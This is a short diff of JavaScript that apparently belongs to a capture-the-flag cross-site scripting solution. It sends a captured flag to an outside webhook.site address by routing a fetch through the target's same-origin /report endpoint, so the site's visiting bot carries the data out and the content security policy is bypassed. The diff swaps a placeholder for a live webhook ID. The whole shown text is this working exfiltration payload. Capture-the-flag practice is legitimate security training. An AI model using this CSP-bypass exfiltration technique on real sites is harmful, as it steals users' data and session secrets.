@@ -9,7 +9,7 @@
     // Step B: Exfiltrate via the /report endpoint
     // /report is on 'self' → CSP allows this fetch!
     // The bot will then visit our webhook URL carrying the flag
-    var exfilUrl = 'https://webhook.site/YOUR-UNIQUE-ID/?flag=' + encodeURIComponent(flag);
+    var exfilUrl = 'https://webhook.site/d06624a7-0585-4a81-971a-d41dd30e1dcb/?flag=' + encodeURIComponent(flag);
     
     // Method 1: Use /report as a relay (bot visits our URL)
     fetch('/report?url=' + encodeURIComponent(exfilUrl));
